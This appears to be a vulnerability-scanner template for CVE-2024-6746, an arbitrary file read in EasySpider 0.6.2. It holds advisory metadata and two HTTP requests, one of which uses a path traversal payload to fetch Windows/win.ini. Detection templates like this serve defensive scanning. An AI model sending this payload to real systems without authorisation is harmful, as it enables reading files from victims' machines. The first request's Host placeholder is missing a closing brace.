id: CVE-2024-6746

info:
  name: EasySpider 0.6.2 - Arbitrary File Read
  author: s4e-io
  severity: medium
  description: |
    A vulnerability classified as problematic was found in NaiboWang EasySpider 0.6.2 on Windows. Affected by this vulnerability is an unknown functionality of the file \EasySpider\resources\app\server.js of the component HTTP GET Request Handler. The manipulation with the input /../../../../../../../../../Windows/win.ini leads to path traversal: '../filedir'. The attack needs to be done within the local network.
  impact: |
    Attackers on the local network can exploit path traversal to read arbitrary files from the Windows filesystem.
  remediation: |
    Update EasySpider to version 0.6.3 or later to address the path traversal vulnerability.
  reference:
    - https://github.com/NaiboWang/EasySpider/issues/466
    - https://cvefeed.io/vuln/detail/CVE-2024-6746
    - https://vuldb.com/?id.271477
    - https://vuldb.com/?submit.371998
    - https://vuldb.com/?ctiid.271477
    - https://github.com/NaiboWang/EasySpider
  classification:
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cve-id: CVE-2024-6746
    cwe-id: CWE-24
    epss-score: 0.82258
    epss-percentile: 0.99189
  metadata:
    vendor: naibowang
    product: easyspider
  tags: cve,cve2024,lfi,network,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /taskGrid/tasklist.html HTTP/1.1
        Host: {{Hostname}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"Task List","Task ID","Task Name","URL","<title>任务列表 | Task List</title>")'
          - "status_code == 200"
        condition: and
        internal: true

  - raw:
      - |
        GET /../../../../../../../../../Windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"bit app support","fonts","extensions")'
          - "status_code == 200"
        condition: and
# digest: 490a0046304402203666d929f6322f7ca8b7688f2332d20c6b3eaaa48ace73bdcd0abd2a7876de3102206b6f82c092d7b50c3efddbde4a8b3e6c9dc92acf6656d87028e2e0bd5d61db81:922c64590222798bb761d5b6d8e72950